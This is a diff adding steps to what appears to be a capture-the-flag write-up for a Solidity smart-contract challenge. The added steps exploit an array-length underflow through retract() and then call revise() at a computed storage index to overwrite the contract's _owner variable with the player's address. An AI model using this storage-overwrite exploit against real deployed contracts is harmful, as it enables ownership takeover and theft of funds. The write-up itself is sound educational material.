@@ -842,3 +842,15 @@ So this way  we can produce an overflow of the contract storage overwriting the 
 ```js
 contract.make_contact();
 ```
+
+After that, we can increase the lenght of the array using the `retract()` function, note that it does not check underflows.
+
+```js
+contract.retract();
+```
+
+And finally, overwrite the `_owner` variable by setting our address in the last position of the array
+
+```js
+contract.revise('35707666377435648211887908874984608119992236509074197713628505308453184860938', '0x000000000000000000000000' + player.slice(2), {from:player, gas: 900000});
+```
